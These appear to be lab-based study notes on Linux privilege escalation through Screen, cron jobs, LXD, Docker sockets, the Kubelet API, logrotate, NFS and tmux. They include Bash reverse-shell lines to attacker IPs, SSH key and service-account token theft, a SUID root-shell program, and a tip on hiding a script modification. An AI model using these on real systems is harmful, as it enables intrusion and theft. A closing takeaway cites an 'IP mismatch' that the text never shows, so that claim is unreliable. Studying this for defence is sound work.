## 1. What "Service-based" Covers

This category is about riding specific installed software, running services, and platform features (containers, orchestration tools, log management) straight to root — rather than exploiting a permission mistake or a shell-environment quirk. The common thread: a legitimate piece of software, doing exactly what it's designed to do, turns out to have a feature or a flaw that goes further than intended once it's running with elevated privileges.

---

## 2. Vulnerable Services: The Screen Example

Software that's genuinely out of date can simply have a known, documented vulnerability sitting in it. **Screen** (a terminal multiplexer, similar to tmux — lets you run multiple terminal sessions inside one console window) is a good concrete example: version 4.5.0 has a privilege escalation flaw caused by a missing permissions check when it opens a log file.

```bash
$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

- `screen -v` prints the installed version — here, `4.05.00` is the same version as "4.5.0," just formatted with a leading zero. Confirming the exact version like this is the first step before trying any version-specific exploit.

```bash
$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

- The flaw lets an attacker truncate (empty out) any file, or create a new file owned by root, in any directory — including `/etc/ld.so.preload`, a file that tells the system to load a specific shared library into *every* program that starts. By pointing that file at a malicious library, the exploit gets its own code executed with root's privileges the moment virtually any program next runs, confirmed here by `id` showing full root access.

## 3. Cron Job Abuse

### 3.1 How Crontab Entries Work

Cron jobs can also be scheduled to run just once, such as at boot, in addition to running repeatedly. The `crontab` command creates a cron file, stored in `/var/spool/cron` for whichever user created it, and run automatically by the cron daemon on the schedule specified. Every crontab entry needs six fields, in this order: minute, hour, day of month, month, day of week, then the command to run. For example, `0 */12 * * * /home/admin/backup.sh` runs every 12 hours.

The root crontab is almost always editable only by root or a user with full sudo rights — but that doesn't mean it can't still be abused indirectly. A **world-writable script** that root's crontab runs is just as good a target as the crontab file itself: even without being able to read the schedule, watching how often a predictable output file (like a dated `.tar.gz` backup) gets created can reveal the job's timing. Certain applications also drop cron files directly into `/etc/cron.d`, which are occasionally misconfigured to allow a non-root user to edit them.

### 3.2 Finding a World-Writable Script Running as Root

```bash
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
<SNIP>
/home/backupsvc/backup.sh
<SNIP>
```

- `-path /proc -prune -o ...` skips over `/proc` (the virtual process filesystem covered in the earlier internals notes — scanning it for permissions is pointless noise), then searches everywhere else for files that are writable by *anyone* (`-perm -o+w`, the "other" permission bit for write access).
- `/dmz-backups/backup.sh` stands out immediately as worth investigating.

```bash
$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

- The timestamps three minutes apart reveal a likely admin typo: the schedule was probably meant to be `0 */3 * * *` (every three *hours*) but was written as `*/3 * * * *` (every three *minutes*). Combined with `backup.sh` being world-writable (`-rwxrwxrwx`) and owned by root, this is a serious misconfiguration on two separate fronts.

### 3.3 Confirming the Job with pspy

[pspy](https://github.com/DominicBreuker/pspy) is a command-line tool that watches running processes and filesystem events without needing root privileges, by scanning `/proc` ([procfs](https://en.wikipedia.org/wiki/Procfs)). It's especially useful for catching cron jobs and other scheduled or background activity you otherwise have no direct visibility into.

```bash
$ ./pspy64 -pf -i 1000

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
<SNIP>
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
```

- `-pf` prints both process events and filesystem events; `-i 1000` scans every 1000 milliseconds (one second).
- This confirms exactly what was suspected: `CRON` (UID 0, meaning root) launches `backup.sh`, which in turn runs `tar` against `/var/www/html` — all running as root, on a very tight schedule.

### 3.4 Hijacking the Script

```bash
$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

- A simple script: build a dated filename, then `tar` up the web root into it.

> **Always keep a backup of any script before editing it**, and append new commands to the *end* so the script's original, expected behavior still completes normally — reducing the chance anyone notices something's wrong.

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

- The added line is a standard Bash-native reverse shell one-liner: it opens a TCP connection to `10.10.14.3:443` and wires an interactive shell through it, no `nc` binary required on the target.

```bash
hacker@kali~:$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
root@NIX02:~# hostname
NIX02
```

- Within three minutes (matching the mistaken schedule), the cron job fires again, runs the modified script, and the reverse shell connects back as root. This specific kind of misconfiguration isn't the most common thing to find in the wild, but it's always worth checking for.

## 4. Containers — The Big Picture

**Containers** virtualize at the *operating system* level, while traditional **virtual machines** virtualize at the *hardware* level. Containers on one host all share that host's kernel, while isolating each application's processes from the rest of the system; full VMs each run their own separate, complete operating system on shared hardware.

Think of containers like separate offices inside one shared office building (sharing the building's power, plumbing, and structure — the "kernel" — but each office is its own isolated space), while VMs are more like entirely separate buildings on the same plot of land, each with its own independent utilities.

Isolation like this matters because it helps manage both resources and security: an application that would otherwise need broad root-level access (say, a web app or API) can be boxed into its own container, limiting what it could reach even if it were fully compromised.

## 5. LXC / LXD Privilege Escalation

**LXC** (Linux Containers) is an OS-level virtualization technique that lets multiple isolated Linux environments run on one host, each with its own processes but sharing the host's kernel. **LXD** builds on this to provide a full *system* container (closer to a lightweight VM) rather than just an application container.

Before this can be used for privilege escalation, the current user needs to belong to the `lxc` or `lxd` group:

```bash
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

Administrators sometimes leave pre-built container image templates lying around with little to no security hardening — these are often found and can be used directly:

```bash
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

```bash
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-----------------------+--------------+--------+---------------------------+--------------+-----------+----------+
|         ALIAS         | FINGERPRINT  | PUBLIC |        DESCRIPTION         | ARCHITECTURE |   TYPE    |   SIZE   |
+-----------------------+--------------+--------+---------------------------+--------------+-----------+----------+
| ubuntu/18.04 (v1.1.2) | 623c9f0bde47 | no     | Ubuntu bionic amd64        | x86_64       | CONTAINER | 106.49MB |
+-----------------------+--------------+--------+---------------------------+--------------+-----------+----------+
```

```bash
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

- `security.privileged=true` disables the isolation features that would otherwise separate the container's "root" user from the host's real root — making them one and the same.
- The second command mounts the entire host filesystem (`/`) into the container at `/mnt/root`.

```bash
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```

- `/mnt/root` is now a direct view of the host's entire filesystem, fully accessible from inside the container as root — every file on the host, including `/mnt/root/etc/shadow` or any user's home directory, is now reachable.

## 6. Docker

### 6.1 Docker Architecture in Brief

| Component | Role |
|---|---|
| **Docker Daemon** | The engine behind Docker — creates, runs, monitors, and isolates containers; pulls and stores images; handles networking and storage (volumes) |
| **Docker Client** | The interface used to issue commands (create, start, stop, remove containers; pull/push/build images), talking to the daemon via a REST API or a Unix socket |
| **Docker Compose** | Orchestrates multiple containers as one application, defined declaratively in a YAML file |
| **Docker Desktop** | A GUI for managing containers on macOS, Windows, or Linux; also supports Kubernetes |

A **Docker image** is a read-only blueprint — application code, dependencies, and configuration bundled together, built from a `Dockerfile`. A **Docker container** is a running, mutable *instance* of an image, isolated with its own filesystem, processes, and network interfaces. Any changes made inside a running container are lost once it's removed, unless explicitly saved as a new image or written to a persistent volume.

### 6.2 Shared Directories (Volume Mounts)

A **volume mount** bridges a directory on the host with a directory inside the container, letting data persist beyond a container's lifespan and letting code or files be shared between the host and the container. Depending on how the administrator configured it, this can be mounted read-only (safer — the container can't modify the host side) or read-write.

```bash
root@container:~$ cd /hostsystem/home/employee
root@container:/hostsystem/home/employee$ ls -l

-rw-------  1 employee employee  12559 Jun 30 15:09 .bash_history
drwxr-x--- 10 employee employee   4096 Jun 30 15:09 .ssh

root@container:/hostsystem/home/employee$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

- An unusual, non-standard directory (`/hostsystem`) found while enumerating inside a container is a strong signal that a host path has been mounted in. Here it leads straight to a host user's private SSH key, which can be copied out and used to log in to the host directly:

```bash
$ ssh employee@<host IP> -i employee.priv
```

### 6.3 Docker Sockets — Escaping a Container

The **Docker socket** is a special file (commonly `/var/run/docker.sock`) that lets a client talk to the Docker daemon. If that socket is reachable from *inside* a container — intentionally or by mistake — it can be used to control Docker on the host itself, from within the container.

```bash
john@container:~/app$ ls -al

srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```

If the `docker` CLI binary isn't already present inside the container, it can be downloaded and made executable:

```bash
john@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
john@container:/tmp$ chmod +x docker
```

```bash
john@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
```

- `-H unix:///app/docker.sock` tells the local `docker` binary to talk to *that* socket specifically, rather than the default one — effectively giving this container full control over the host's Docker daemon.

```bash
john@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

john@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

- This launches a brand-new **privileged** container, mounting the entire host root filesystem (`/`) into it at `/hostsystem` — the same escalation pattern seen with LXD in Section 5.
- Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`:

```bash
john@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

- From inside that new privileged container, the host's root SSH key is directly readable — giving a path straight back to the host as root.

### 6.4 The Docker Group

Being in the `docker` group effectively grants root-equivalent access, since it lets a user control the Docker daemon directly:

```bash
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

The same holds true if the `docker` binary itself has the SUID bit set, or if the user has sudo rights specifically to run `docker` — all three routes let the same kind of escalation happen.

Most hosts have a direct internet connection because the base images and containers must be downloaded. However, many hosts may be disconnected from the internet at night and outside working hours for security reasons. However, if these hosts are located in a network where, for example, a web server has to pass through, it can still be reached.

To see which images exist and which we can access, we can use the following command:
```bash
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

### 6.5 A Writable Docker Socket

If the Docker socket is **writable** by a user who isn't actually in the `docker` or `root` group — a straightforward permissions mistake — that alone is enough to escalate:

```bash
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
```

- `-v /:/mnt` mounts the host's root filesystem into a fresh container at `/mnt`, and `chroot /mnt bash` immediately switches the container's own root directory to that mount — landing directly inside what is, for all practical purposes, the host's own root shell.

## 7. Kubernetes

### 7.1 Core Concepts

**Kubernetes** (K8s) is a container *orchestration* platform — it doesn't run applications itself so much as manage fleets of containers across many machines: deployment, scaling, networking, and self-healing (restarting failed containers automatically). Originally developed by Google and now maintained by the Cloud Native Computing Foundation, it's become the standard tool for running containerized applications at scale.

The basic unit in Kubernetes is the **pod** — one or more tightly coupled containers that share networking and storage, acting much like a single lightweight virtual machine with its own IP and hostname.

Kubernetes architecture splits into two main parts:

| Component | Role |
|---|---|
| **Control Plane** (master node) | Manages and coordinates the whole cluster, maintaining its desired state |
| **Worker Nodes** ("minions") | Actually run the containerized applications, following instructions from the Control Plane |

Key Control Plane services and their default ports:

| Service | TCP Port(s) |
|---|---|
| etcd (cluster's key-value data store) | 2379, 2380 |
| API server | 6443 |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| Kubelet API | 10250 |
| Read-Only Kubelet API | 10255 |

The **API server** is the single entry point for every administrative action — whether from a human using `kubectl` or from internal controllers — and it reads and writes the cluster's actual state to `etcd`.

### 7.2 Docker vs. Kubernetes

| Function | Docker | Kubernetes |
|---|---|---|
| Primary role | Platform for containerizing applications | Orchestration tool for managing containers at scale |
| Scaling | Manual (via Docker Swarm) | Automatic |
| Networking | Single network | Complex, policy-driven networking |
| Storage | Volumes | A wide range of storage options |

### 7.3 The Kubernetes API and Authentication

Kubernetes supports multiple authentication methods (client certificates, bearer tokens, an authenticating proxy, or basic HTTP auth), and once a request is authenticated, **Role-Based Access Control (RBAC)** decides what that identity is actually allowed to do.

A serious, common misconfiguration: the **Kubelet** (the agent running on each worker node) allows **anonymous access by default**. Any unauthenticated request is treated as `system:anonymous` — meaning anyone who can reach the Kubelet API at all might be able to interact with it without any credentials.

```bash
employee@k8:~$ curl https://10.129.10.11:6443 -k

{
    "status": "Failure",
    "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
    "reason": "Forbidden",
    "code": 403
}
```

- This attempt against the main API server (port 6443) was correctly rejected — the root path requires an authenticated, authorized user. But the *Kubelet* API, on a different port, is a different story.

### 7.4 Enumerating Pods via the Kubelet API

```bash
employee@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

{
  "kind": "PodList",
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{...\"image\":\"nginx:1.14.2\"...}"
        }
      }
    }
  ]
}
```

- Port **10250** (the Kubelet API, see the table above) answers this request without authentication, revealing pod names, namespaces, and — notably — the `last-applied-configuration` annotation, which can expose container image names, pull policies, and occasionally even secrets baked into how a pod was deployed.
- Knowing the exact container images in use lets an attacker check each one for known vulnerabilities; namespace and metadata details help map out the cluster for further targeting.

[kubeletctl](https://github.com/cyberark/kubeletctl) is a purpose-built tool for interacting with the Kubelet API more conveniently:

```bash
employee@k8:~$ kubeletctl -i --server 10.129.10.11 pods

│ POD                  │ NAMESPACE   │ CONTAINERS │
│ coredns-78fcd69978   │ kube-system │ coredns    │
│ nginx                │ default     │ nginx      │
│ etcd-steamcloud      │ kube-system │ etcd       │
```

### 7.5 Finding and Exploiting RCE-Vulnerable Pods

```bash
employee@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

│ NODE IP      │ PODS             │ NAMESPACE   │ CONTAINERS │ RCE │
│ 10.129.10.11 │ nginx            │ default     │ nginx      │ +   │
│              │ etcd-steamcloud  │ kube-system │ etcd       │ -   │
```

- `scan rce` checks every discovered pod to see which ones will actually let commands be run inside them remotely — here, `nginx` is flagged as vulnerable (`+`), `etcd` is not (`-`).

```bash
employee@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

- Commands can be run directly inside the `nginx` container's `nginx` container-process, and this one confirms it's running as root — administrative access inside that pod.

### 7.6 Extracting Tokens and Certificates

Every pod running with a Kubernetes service account typically has that account's authentication token and certificate mounted inside it by default — useful well beyond just that one pod.

```bash
employee@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

```bash
employee@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
-----END CERTIFICATE-----
```

- With both the token and the certificate, requests can now be made directly against the main Kubernetes API server, authenticated as this service account.

```bash
employee@k8:~$ export token=`cat k8.token`
employee@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources                      Verbs
pods                           [get create list]
...SNIP...
```

- `auth can-i --list` shows exactly what this identity is authorized to do — here, the ability to `get`, `create`, and `list` pods, which is exactly what's needed to build a new, malicious pod next.

### 7.7 Building a Pod to Reach the Host

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

- This pod definition mounts the **host's** root filesystem (`hostPath: path: /`) into the new pod at `/root` — the same underlying trick as the LXD and Docker examples earlier, just expressed in Kubernetes' own YAML format.

```bash
employee@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 apply -f privesc.yaml

pod/privesc created

employee@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 get pods

NAME    READY   STATUS  RESTARTS    AGE
privesc 1/1     Running 0           12s
```

```bash
employee@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```

- With the host filesystem mounted at `/root` inside the new pod, `/root/root/.ssh/id_rsa` is actually `/root/.ssh/id_rsa` on the host — its root SSH key, now readable from inside a pod that was created with permissions that should have been far more limited.

## 8. Logrotate Exploitation

Every Linux system generates large volumes of logs. **logrotate** manages this automatically — archiving, compressing, or discarding old logs based on rules like file size, age, and what action to take once a threshold is hit — usually run periodically via cron, and configured through `/etc/logrotate.conf` plus drop-in files under `/etc/logrotate.d/`.

```bash
$ cat /etc/logrotate.conf

weekly
su root adm
rotate 4
create
include /etc/logrotate.d
```

- `weekly` and `rotate 4` mean logs rotate once a week, keeping four weeks of history. `su root adm` means rotation runs as root, using the `adm` group (the same group covered in the earlier permission-based notes, which can read `/var/log`). `create` means a new, empty log file is created immediately after the old one is rotated out.

```bash
$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```bash
$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

To exploit logrotate directly, three conditions need to line up:

1. Write permission on the log file(s) being rotated.
2. logrotate running as a privileged user (root).
3. A vulnerable logrotate version: **3.8.6, 3.11.0, 3.15.0, or 3.18.0**.

If those line up, a prebuilt exploit called [logrotten](https://github.com/whotwagner/logrotten) can be used:

```bash
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

```bash
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

- Before running the exploit, it's important to check which specific behavior logrotate is configured to use — `create` or `compress` — since the exploit needs to be aimed at whichever option is actually active:

```bash
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```
- In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.
- After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.

```bash
hacker@kali$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

```bash
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```bash
Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

## 9. Miscellaneous Techniques

### 9.1 Passive Traffic Capture

If `tcpdump` is installed and accessible, even an unprivileged user may be able to capture network traffic — sometimes including credentials sent in cleartext. Tools such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) are built specifically to pull credentials and other sensitive data straight out of captured traffic. This can expose:

- Credit card numbers, SNMP community strings
- Net-NTLMv2, SMBv2, or Kerberos hashes (crackable offline to recover a plaintext password)
- Cleartext-protocol credentials from HTTP, FTP, POP, IMAP, telnet, or SMTP — any of which might be reusable elsewhere on the host.

### 9.2 Weak NFS Privileges

**NFS** (Network File System, using TCP/UDP port 2049) lets Unix/Linux systems share files and directories over the network. Anyone can check what's exported, without any special access:

```bash
$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Two key export options control how root access carries over the network:

| Option | What It Does |
|---|---|
| `root_squash` | The remote root user is automatically mapped down to `nfsnobody`, an unprivileged account — anything they create is owned by `nfsnobody`, blocking them from uploading a SUID-root binary |
| `no_root_squash` | The remote root user keeps full root privileges on the share — they can create files, including SUID binaries, owned by the real root user |

```bash
employee@NIX02:~$ cat /etc/exports

/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

- Both shares here allow `no_root_squash` — a serious misconfiguration, since it means root privileges carry straight through from any connecting client.

The attack: build a SUID-root binary locally (where you already have root, e.g. on your own attacking VM), then use the NFS mount to smuggle it onto the target as if it were root who placed it.

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
hacker@root:/tmp$ gcc shell.c -o shell
hacker@root:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
hacker@root:/tmp$ cp shell /mnt
hacker@root:/tmp$ chmod u+s /mnt/shell
```

- Because `no_root_squash` is set, the binary copied in while acting as root on the attacker's own machine ends up owned by root on the target's side too — and the SUID bit survives the copy.

```bash
employee@NIX02:/tmp$  ls -la

-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
```

```bash
employee@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(evilcorp)
```

- Running the planted binary from the low-privileged side instantly grants a root shell, since the binary is both SUID and owned by root.

### 9.3 Hijacking tmux Sessions

**tmux**, like `Screen`, is a terminal multiplexer — it lets a user detach from a session while leaving it running in the background (handy for a long-running task like an `nmap` scan). If a privileged user (like root) leaves a tmux session running with loose permissions, that session itself can be hijacked.

```bash
employee@NIX02:~$ tmux -S /shareds new -s debugsess
employee@NIX02:~$ chown root:devs /shareds
```

- `-S /shareds` creates the session backed by a specific socket file, rather than tmux's default location — and that socket file's ownership can then be loosened, here handed to the `devs` group.

**Check for any running `tmux` processes:**
```bash
employee@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

**Confirm permissions:**
```bash
employee@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

**Review our group membership:**
```bash
employee@NIX02:~$ id

uid=1000(evilcorp) gid=1000(evilcorp) groups=1000(evilcorp),1011(devs)
```

- The current user belongs to `devs`, and the session's socket is readable and writable by that same group — meaning this session can be attached to directly.

**Finally, attach to the `tmux` session and confirm root privileges:**
```bash
employee@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

- Attaching to the shared socket drops straight into root's existing tmux session — full root access, with no password or exploit needed, simply because the session's permissions were left too loose.

## 11. Cheat Sheet

| Goal | Command |
|---|---|
| Check Screen version | `screen -v` |
| Find world-writable files (excluding `/proc`) | `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` |
| Watch processes/cron without root | `./pspy64 -pf -i 1000` |
| Check LXD/LXC group membership | `id` |
| Spawn a privileged LXD container with host mounted | `lxc init <image> <name> -c security.privileged=true` then `lxc config device add <name> <dev> disk source=/ path=/mnt/root recursive=true` |
| Talk to a reachable Docker socket | `docker -H unix://<path to .sock> ps` |
| Escalate via a writable Docker socket | `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash` |
| Query the Kubelet API for pods (no auth) | `curl https://<node-ip>:10250/pods -k` |
| Enumerate pods with kubeletctl | `kubeletctl -i --server <ip> pods` |
| Scan pods for RCE | `kubeletctl -i --server <ip> scan rce` |
| Run a command in a pod | `kubeletctl -i --server <ip> exec "<cmd>" -p <pod> -c <container>` |
| Pull a pod's service account token/cert | `kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container>` |
| Check what an identity can do | `kubectl --token=$token --certificate-authority=ca.crt --server=<url> auth can-i --list` |
| Check logrotate's active mode | `grep "create\|compress" /etc/logrotate.conf \| grep -v "#"` |
| Check NFS exports remotely | `showmount -e <target-ip>` |
| Check group ownership of a shared tmux socket | `ls -la <socket path>` |
| Attach to a loosely-permissioned tmux session | `tmux -S <socket path>` |

## 12. Big-Picture Takeaways

1. **"It's just a container/VM" doesn't mean it's isolated from the host.** LXD, Docker, and Kubernetes all offer the same underlying escape hatch in different forms: if a container (or pod) can be launched with elevated privileges and the host filesystem mounted inside it, that container becomes a direct tunnel to the host.
2. **Group membership can be worth more than it looks.** Being in `lxd`, `docker`, `devs` (for a loose tmux socket), or having write access to a Docker socket are all, functionally, equivalent to having root — even though none of them hand over a password or a sudo entry directly.
3. **Scheduled, automated processes running as root are consistently high-value.** Whether it's a cron job touching a world-writable script, or logrotate processing a log file you can write to, the pattern is the same: find something privileged that runs automatically and predictably, and make it run your code instead.
4. **Default settings are often the weak point, not custom configuration.** The Kubelet's default-on anonymous access and NFS's `no_root_squash` are both "out of the box" behaviors that administrators have to actively turn off — meaning plenty of real systems simply never get around to it.
5. **Tools built for exactly this job save enormous time.** pspy for watching hidden cron activity, kubeletctl for talking to the Kubernetes Kubelet API, and prebuilt exploits like logrotten all turn a manual, error-prone process into something fast and repeatable.
6. **Always verify the actual target before reusing credentials or tokens across commands.** The IP mismatch spotted in the Kubernetes walkthrough (Section 7.6) is a good reminder to double check that every command in a multi-step chain is actually pointed at the same host, especially once authentication material like tokens and certificates are being passed around.
7. **The underlying goal across every technique is still the same: reach a root-equivalent context and confirm it concretely** — with `id`, `whoami`, or an equivalent check — rather than assuming a technique worked just because no error was shown.
